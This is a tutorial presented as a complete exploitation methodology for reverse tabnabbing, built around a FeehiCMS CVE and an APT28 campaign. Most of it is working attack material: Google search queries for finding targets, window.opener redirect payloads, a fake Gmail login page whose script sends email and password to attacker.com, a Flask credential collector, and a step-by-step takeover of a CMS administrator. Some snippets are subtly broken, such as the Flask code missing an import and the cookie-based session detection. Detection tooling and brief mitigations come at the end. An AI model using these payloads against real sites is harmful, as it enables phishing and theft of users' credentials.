# Complete Tabnabbing Exploitation Methodology

## Introduction

Tabnabbing (also known as reverse tabnabbing) is a phishing attack technique where a malicious page rewrites the content of a parent page that opened it. The attack was first described by Aza Raskin in 2010  and has since been used by advanced threat actors, including state-sponsored groups like Fancy Bear (APT28) .

The attack works because when a link opens in a new tab using `target="_blank"`, the new page receives a reference to the original page through the `window.opener` object. Unless properly protected, this allows the malicious page to control the original tab's location.


## How Tabnabbing Works - Simple Explanation

1. You click a link on a trusted website that opens in a new tab
2. The new tab loads a malicious page
3. This malicious page contains code that silently changes the original tab's content to a fake login page
4. When you return to the original tab, you see what looks like a legitimate login screen asking for your credentials
5. You enter your username and password, which are sent to the attacker

The attack is particularly effective because it exploits how users interact with multiple browser tabs. Users rarely check the URL bar when returning to a tab they believe they already had open and authenticated to.


## The 2025 FeehiCMS Vulnerability - Real-World Example

A real-world example of this vulnerability was discovered and published in late 2025. **CVE-2025-63522** affects FeehiCMS version 2.1.1, specifically within the Comments Management function .

**Vulnerability Details:**
- **Affected Software**: FeehiCMS 2.1.1
- **Location**: Comments Management function
- **Attack Vector**: Network-based
- **Privileges Required**: Low (attacker needs ability to post comments)
- **User Interaction**: Required (victim must click the malicious link)
- **CVSS Score**: 4.6 (Medium severity) 
- **CWE Category**: CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) 

**How It Was Exploitable:**
In FeehiCMS, users with low-privilege access could post comments containing malicious links. When these links were opened with `target="_blank"` attributes and lacked proper `rel="noopener noreferrer"` protections, the linked page could hijack the original CMS tab .

**Affected Countries**: Germany, France, United Kingdom, Netherlands, Italy, Spain, Poland 


## Historical Attack by Fancy Bear (APT28)

The Russian state-sponsored hacking group known as Fancy Bear (also called APT28, Pawn Storm, or Sofacy) has used tabnabbing in their phishing campaigns .

**Attack Scenario as documented by Trend Micro:**

1. The target receives an email appearing to come from a legitimate source (conference, news site, or service they subscribe to)
2. The email contains a link that looks legitimate
3. When clicked, the link opens a new tab showing the genuine website (conference page or news article)
4. Before the redirect to the legitimate content, a simple script runs that changes the original email tab to a phishing site
5. After finishing reading the legitimate content, the user returns to their email tab
6. The email tab now shows a "session expired" message asking for credentials
7. The user re-enters their password, giving it to the attackers 

This demonstrates that tabnabbing is not merely theoretical - it has been deployed in real-world targeted attacks by sophisticated adversaries.


## Complete Methodology for Exploitation

### Phase 1: Target Identification and Reconnaissance

The attacker first identifies websites where they can inject or post links. Common targets include:

- **Comment sections** on blogs, articles, and CMS platforms
- **Forum posts** and discussion threads
- **User profile pages** that allow external links
- **Wiki pages** and collaborative documentation platforms
- **Any web application** that accepts user-submitted URLs

**Search queries for finding vulnerable instances:**

```bash
# Find sites with comment functionality
site:example.com "post a comment" target="_blank"
site:example.com "reply" target="_blank"

# Identify CMS platforms known to have tabnabbing issues
"Powered by FeehiCMS" inurl:comment
```

### Phase 2: Vulnerability Assessment

For each target where link injection is possible, the attacker checks if the site is vulnerable:

**Check 1: Link Rendering Analysis**
- Does the application open external links in new tabs (`target="_blank"`)?
- Does the link include `rel="noopener"` or `rel="noopener noreferrer"`?
- If `noopener` is missing, the site is vulnerable 

**Check 2: Browser Behavior Testing**
- Modern browsers (Chrome 88+, Firefox 79+, Safari 12.1+, Edge 88+) add implicit `noopener` protection
- Older browsers or specific configurations may still be vulnerable
- Testing should be performed on the target browser environment 

**Check 3: JavaScript Context**
- Can JavaScript be executed in the linked page?
- Are there Content Security Policy (CSP) restrictions?

### Phase 3: Malicious Payload Development

**Basic JavaScript Payload:**

```html
<script>
// Immediate redirect - most detectable
if (window.opener) {
    window.opener.location = "https://attacker-controlled.com/phishing";
}
</script>
```

**Stealthy Delayed Payload:**

```html
<script>
// Wait for user to lose focus on original tab
if (window.opener) {
    setTimeout(function() {
        window.opener.location = "https://attacker-controlled.com/phishing";
    }, 5000);  // 5 second delay
}
</script>
```

**Scriptless Payload (Meta Refresh):**

```html
<!-- Works even if JavaScript is disabled -->
<meta http-equiv="refresh" content="5; url=https://attacker-controlled.com/phishing">
```

The scriptless approach is important because it bypasses JavaScript blockers. However, NoScript has a specific countermeasure that blocks refreshes in background tabs using the `noscript.forbidBGRefresh` setting .

**Complete Malicious Page Template:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Interesting Article - Loading...</title>
    <!-- Fake favicon to mimic target site -->
    <link rel="icon" type="image/png" href="https://target.com/favicon.ico">
    <script>
        // Detect if page has lost focus (user switched tabs)
        let hasRedirected = false;
        
        function attemptTabnabbing() {
            if (hasRedirected) return;
            if (window.opener && !window.opener.closed) {
                hasRedirected = true;
                // Change original tab to phishing page
                window.opener.location = "https://attacker.com/phishing.html";
                // Optional: Also change this tab to legitimate content
                window.location = "https://legitimate-article.com/content";
            }
        }
        
        // Method 1: Delay then redirect
        setTimeout(attemptTabnabbing, 3000);
        
        // Method 2: Redirect when page loses focus
        window.addEventListener('blur', function() {
            setTimeout(attemptTabnabbing, 1000);
        });
    </script>
</head>
<body>
    <h1>Loading content, please wait...</h1>
    <p>This page is loading the requested article.</p>
</body>
</html>
```

**Phishing Page Template:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Gmail: Email from Google</title>
    <link rel="icon" type="image/png" href="https://mail.google.com/favicon.ico">
    <style>
        /* Copy target site's CSS for realism */
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .login-box { width: 400px; margin: 100px auto; background: white; padding: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Sign in</h1>
        <p>Your session has expired. Please sign in again.</p>
        <form action="https://attacker.com/collect" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        // Credential harvesting
        document.querySelector('form').addEventListener('submit', function(e) {
            var data = {
                email: document.querySelector('[name="email"]').value,
                password: document.querySelector('[name="password"]').value,
                timestamp: new Date().toISOString(),
                target: document.referrer
            };
            // Send to attacker server
            fetch('https://attacker.com/api/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
    </script>
</body>
</html>
```

### Phase 4: Delivery and Deployment

The attacker must inject the malicious link into the target website. Methods include:

1. **Comment Posting** - Most common method, as seen in CVE-2025-63522 
2. **Forum Thread Creation** - Starting new discussions with malicious links
3. **Profile Link Manipulation** - Adding malicious URLs to user profiles
4. **Compromised Ad Networks** - Serving malicious ads that exploit tabnabbing
5. **Email Phishing** - Sending emails that open legitimate content while hijacking the email tab 

**Example malicious link to post in comments:**

```html
<a href="https://attacker-controlled.com/evil.html" target="_blank">Check out this interesting article!</a>
```

The link appears legitimate but opens the attacker's page in a new tab.

### Phase 5: Credential Harvesting

When the victim returns to the original tab and sees the fake login page, they enter credentials. The attacker must have a server to collect these:

**Simple credential collector (server-side):**

```python
# Flask collector example
from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Log or store credentials
    with open('creds.txt', 'a') as f:
        f.write(f"{email}:{password}\n")
    
    # Redirect to legitimate site to avoid suspicion
    return redirect("https://target.com")

@app.route('/api/collect', methods=['POST'])
def api_collect():
    data = request.json
    # Store JSON credentials
    return {"status": "success"}
```


## Tools for Testing and Exploitation

### Burp Suite Extension

A dedicated Burp Suite Professional extension is available for tabnabbing detection. The **burp-tabnabbing-extension** by AdrianCitu is written in Java and provides configurable scanning strategies .

**Configuration Options:**

| Strategy | Description |
|----------|-------------|
| `STOP_AFTER_FIRST_FINDING` | Stops scanning after first vulnerable link is found |
| `STOP_AFTER_FIRST_HTML_AND_JS_FINDING` | Stops after finding first HTML and JavaScript vulnerability |
| `SCAN_ENTIRE_PAGE` | Scans entire page (default behavior) |

**Setup:**
```bash
# Set system variable for scan strategy
java -Dtabnabbing.pagescan.strategy=STOP_AFTER_FIRST_FINDING -jar burp-tabnabbing-extension.jar
```

### Nuclei Templates

Nuclei can be used with custom templates to detect tabnabbing vulnerabilities:

```yaml
# tabnabbing-check.yaml
id: tabnabbing-detection

info:
  name: Reverse Tabnabbing Detection
  author: security-researcher
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    extractors:
      - type: regex
        name: vulnerable_links
        regex:
          - '<a[^>]*target="_blank"[^>]*>(?:(?!noopener).)*?</a>'
        internal: true
```

**Run detection:**
```bash
nuclei -t tabnabbing-check.yaml -u https://target.com
```

### Manual Browser Testing

**Step-by-step manual testing:**

1. Open browser Developer Tools (F12)
2. Use the Elements tab to search for `target="_blank"`
3. For each found link, check if `rel="noopener"` is present
4. If missing, the link is potentially vulnerable

**JavaScript console testing:**
```javascript
// Find all links opening in new tabs
document.querySelectorAll('a[target="_blank"]').forEach(link => {
    if (!link.rel.includes('noopener')) {
        console.log('VULNERABLE:', link.href);
        console.log('Current rel:', link.rel);
    }
});
```

### Automated Crawling with Katana

```bash
# Crawl website and extract links
katana -u https://target.com -d 3 -o crawled_urls.txt

# Check each page for vulnerable links
while read url; do
    curl -s "$url" | grep -oP '<a[^>]*target="_blank"[^>]*>' | grep -v 'noopener' && echo "Found in: $url"
done < crawled_urls.txt
```

### PayloadsAllTheThings Resources

The **PayloadsAllTheThings** repository contains comprehensive tabnabbing testing methodologies and includes a tool called `discovering-reversetabnabbing` from PortSwigger for automated discovery .


## How to Test for Tabnabbing Vulnerabilities

### Test Case 1: Basic Link Testing

**Test Steps:**
1. Identify a page where you can submit links (comment, forum post, profile)
2. Submit a test link: `<a href="https://webhook.site/your-test-id" target="_blank">Test Link</a>`
3. Open the link in a new tab
4. Check if `window.opener` is accessible from the test page
5. If accessible, attempt redirect: `window.opener.location = "https://webhook.site/redirect-test"`

**Expected vulnerable behavior:** The original page redirects to the specified URL

### Test Case 2: Automated Link Analysis

```javascript
// Run this in browser console on target page
function analyzeTabnabbingRisk() {
    const links = document.querySelectorAll('a[target="_blank"]');
    let vulnerable = [];
    
    links.forEach(link => {
        if (!link.hasAttribute('rel') || !link.rel.includes('noopener')) {
            vulnerable.push({
                href: link.href,
                rel: link.rel || 'missing',
                text: link.innerText
            });
        }
    });
    
    console.table(vulnerable);
    return vulnerable;
}

analyzeTabnabbingRisk();
```

### Test Case 3: Exploit Simulation

Create a proof-of-concept HTML page to test if the target is vulnerable:

```html
<!-- tester.html - host on your server -->
<!DOCTYPE html>
<html>
<head><title>Tabnabbing Test</title></head>
<body>
    <h1>Testing...</h1>
    <script>
        if (window.opener) {
            // Attempt to redirect opener to test page
            window.opener.location = "https://webhook.site/your-id?vulnerable=true";
            document.body.innerHTML = "<h2>Vulnerable! Original tab was redirected.</h2>";
        } else {
            document.body.innerHTML = "<h2>Not vulnerable or no opener found.</h2>";
        }
    </script>
</body>
</html>
```

Post a link to this test page on the target website. If the original page redirects to your webhook URL, the site is vulnerable.

### Test Case 4: Browser-Specific Testing

Test across different browser versions as behavior varies:

| Browser | Version | Implicit Protection |
|---------|---------|---------------------|
| Chrome | < 88 | No protection |
| Chrome | 88+ | Adds `noopener` automatically |
| Firefox | < 79 | No protection |
| Firefox | 79+ | Adds `noopener` automatically |
| Safari | < 12.1 | No protection |
| Safari | 12.1+ | Adds `noopener` automatically |
| Edge | < 88 | No protection |
| Edge | 88+ | Adds `noopener` automatically |


## Real-World Exploitation Walkthrough

### Scenario: Compromising a CMS Comment Section

**Step 1: Identify Target**
The attacker finds a FeehiCMS 2.1.1 website with comment functionality enabled .

**Step 2: Account Creation**
The attacker registers a low-privilege account (required privileges: Low) .

**Step 3: Craft Malicious Comment**
The attacker posts a comment containing:
```html
<a href="https://attacker.com/evil.html" target="_blank">Click here for exclusive content!</a>
```

**Step 4: Malicious Page Hosting**
The attacker hosts `evil.html` on their server with the following content:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Exclusive Content - Loading</title>
    <link rel="icon" href="https://target.com/favicon.ico">
    <meta http-equiv="refresh" content="3; url=https://legitimate-article.com">
</head>
<body>
    <script>
        setTimeout(function() {
            if (window.opener) {
                window.opener.location = "https://attacker.com/phishing.html";
            }
        }, 2000);
    </script>
    <p>Loading content, please wait...</p>
</body>
</html>
```

**Step 5: Phishing Page**
The phishing page mimics the CMS login screen:
```html
<!DOCTYPE html>
<html>
<head>
    <title>FeehiCMS - Session Expired</title>
    <link rel="icon" href="https://target.com/favicon.ico">
</head>
<body>
    <form action="https://attacker.com/collect" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login Again</button>
    </form>
</body>
</html>
```

**Step 6: Attack Execution**
1. Administrator visits the page with the comment
2. Clicks the "exclusive content" link
3. New tab opens and shows loading message before redirecting to legitimate content
4. Original CMS tab silently changes to phishing page
5. Administrator returns to CMS tab, sees login prompt, enters credentials
6. Credentials are captured by attacker

**Step 7: Post-Exploitation**
The attacker now has administrative access to the CMS and can:
- Deface the website
- Install backdoors
- Access the database
- Pivot to internal systems


## Advanced Exploitation Techniques

### Session Detection

More sophisticated attacks can detect what services the user is logged into:

```javascript
// Check what the user is logged into by examining cookies or DOM
function detectActiveSessions() {
    // Check for Gmail
    if (document.cookie.includes('GMAIL_LOGIN')) {
        return 'gmail';
    }
    // Check for Facebook
    if (window.opener.document.querySelector('[aria-label="Facebook"]')) {
        return 'facebook';
    }
    return null;
}

// Tailor phishing page based on detected service
const service = detectActiveSessions();
if (service === 'gmail') {
    window.opener.location = "https://attacker.com/fake-gmail.html";
}
```

### Combined with Clickjacking

Tabnabbing can be combined with clickjacking for more sophisticated attacks:

```html
<!-- Hidden iframe that triggers tabnabbing when clicked -->
<iframe src="malicious.html" style="opacity:0; position:absolute;"></iframe>
```

### Cross-Browser Fingerprinting

```javascript
// Detect browser to use appropriate exploit technique
const isChrome = navigator.userAgent.includes('Chrome');
const isFirefox = navigator.userAgent.includes('Firefox');

if (isChrome && navigator.userAgent.match(/Chrome\/(\d+)/)[1] < 88) {
    // Vulnerable Chrome version - exploit works
    window.opener.location = "https://attacker.com/phishing.html";
}
```


## Mitigation and Prevention

### For Developers

1. **Always add security attributes:**
   ```html
   <a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>
   ```

2. **For JavaScript windows:**
   ```javascript
   window.open('https://external.com', '_blank', 'noopener,noreferrer');
   ```

3. **Implement Content Security Policy:**
   ```
   Content-Security-Policy: navigate-to 'self' https://trusted.com
   ```

4. **Sanitize user input:** Remove or escape `target="_blank"` from user-submitted links

### For Users

1. Use NoScript extension which blocks background tab refreshes (`noscript.forbidBGRefresh`) 
2. Always check the URL bar before entering credentials
3. Be suspicious of unexpected login prompts
4. Keep browsers updated to receive implicit protection


## References

1. CVE-2025-63522 - Reverse Tabnabbing in FeehiCMS 2.1.1 
2. GHSA-w756-rf26-7rmr - FeehiCMS Vulnerability Disclosure 
3. Burp Suite Tabnabbing Extension - AdrianCitu 
4. SANS ISC - Tabnabbing Analysis (2010) 
5. PayloadsAllTheThings - Tabnabbing Methodology 
6. Politico - Fancy Bear Tabnabbing Campaign (2017) 
